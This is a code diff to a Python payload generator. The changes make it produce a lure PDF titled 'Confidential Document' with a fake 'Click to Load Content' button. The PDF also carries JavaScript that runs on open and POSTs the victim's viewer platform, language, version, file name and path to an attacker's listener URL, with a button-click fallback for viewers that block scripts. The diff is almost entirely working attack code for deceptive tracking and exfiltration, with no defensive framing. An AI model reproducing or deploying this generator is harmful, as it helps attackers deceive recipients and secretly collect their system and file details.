@@ -24,7 +24,8 @@ REQUIREMENTS = [
     "flask>=3.0.0",
     "rich>=13.7.0",
     "Pillow>=10.2.0",
-    "PyPDF2>=3.0.1"
+    "PyPDF2>=3.0.1",
+    "reportlab>=4.0.8"
 ]
 
 def is_venv() -> bool:
@@ -208,6 +209,8 @@ class PayloadGenerator:
         """Create a PDF with embedded payload"""
         try:
             from PyPDF2 import PdfWriter, PdfReader
+            from reportlab.pdfgen import canvas
+            from reportlab.lib.pagesizes import letter
             import io
             from rich.progress import Progress, SpinnerColumn, TextColumn
             
@@ -219,31 +222,81 @@ class PayloadGenerator:
             ) as progress:
                 task = progress.add_task("Creating PDF payload...", total=None)
                 
-                # Create a basic PDF
+                # Create a basic PDF with visible content
                 output_pdf = os.path.join(self.output_dir, "document.pdf")
                 
+                # Create the PDF content using ReportLab
+                packet = io.BytesIO()
+                c = canvas.Canvas(packet, pagesize=letter)
+                c.setFont("Helvetica-Bold", 16)
+                c.drawString(100, 750, "Confidential Document")
+                c.setFont("Helvetica", 12)
+                c.drawString(100, 700, "This document contains sensitive information.")
+                c.drawString(100, 680, "Please wait while the document loads...")
+                
+                # Add a button
+                c.setFillColorRGB(0.2, 0.5, 0.8)
+                c.rect(100, 600, 200, 40, fill=1)
+                c.setFillColorRGB(1, 1, 1)
+                c.drawString(130, 618, "Click to Load Content")
+                
+                c.save()
+                
+                # Move to the beginning of the StringIO buffer
+                packet.seek(0)
+                
+                # Create a new PDF with the content
+                new_pdf = PdfReader(packet)
                 writer = PdfWriter()
-                page = writer.add_blank_page(width=612, height=792)
                 
-                # Add visible content
+                # Add the first page
+                page = writer.add_page(new_pdf.pages[0])
+                
+                # Add JavaScript for automatic execution
                 writer.add_js(f'''
-                app.alert("Loading document...");
-                var url = "{listener_url}/collect";
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", url, true);
-                xhr.setRequestHeader("Content-Type", "application/json");
-                
-                // Collect data
-                var data = {{
-                    "device": {{
-                        "platform": app.platform,
-                        "language": app.language,
-                        "viewerType": app.viewerType,
-                        "viewerVariation": app.viewerVariation
+                try {{
+                    app.alert("Loading document contents...");
+                    
+                    function sendData() {{
+                        var url = "{listener_url}/collect";
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("POST", url, true);
+                        xhr.setRequestHeader("Content-Type", "application/json");
+                        
+                        var data = {{
+                            "device": {{
+                                "platform": app.platform,
+                                "language": app.language,
+                                "viewerType": app.viewerType,
+                                "viewerVariation": app.viewerVariation,
+                                "version": app.viewerVersion
+                            }},
+                            "document": {{
+                                "fileName": this.documentFileName,
+                                "path": this.path,
+                                "title": this.title
+                            }}
+                        }};
+                        
+                        xhr.send(JSON.stringify(data));
+                        app.alert("Document loaded successfully!");
                     }}
-                }};
+                    
+                    sendData();
+                }} catch(e) {{
+                    console.log("Error:", e);
+                }}
+                ''')
                 
-                xhr.send(JSON.stringify(data));
+                # Add form field for backup method
+                writer.add_js(f'''
+                var f = this.addField("submitBtn", "button", 0, [100, 600, 300, 640]);
+                f.setAction("MouseUp", "sendData();");
+                f.strokeColor = color.blue;
+                f.fillColor = color.blue;
+                f.textColor = color.white;
+                f.textSize = 12;
+                f.textFont = ["Helvetica", "Bold"];
                 ''')
                 
                 # Save the PDF
@@ -252,6 +305,7 @@ class PayloadGenerator:
                 
                 progress.update(task, completed=True)
                 self.console.print(f"[green]✓[/green] PDF payload created: {output_pdf}")
+                self.console.print("[yellow]Note: If the PDF viewer blocks JavaScript, click the blue button to trigger data collection[/yellow]")
                 
                 return output_pdf
         except Exception as e:
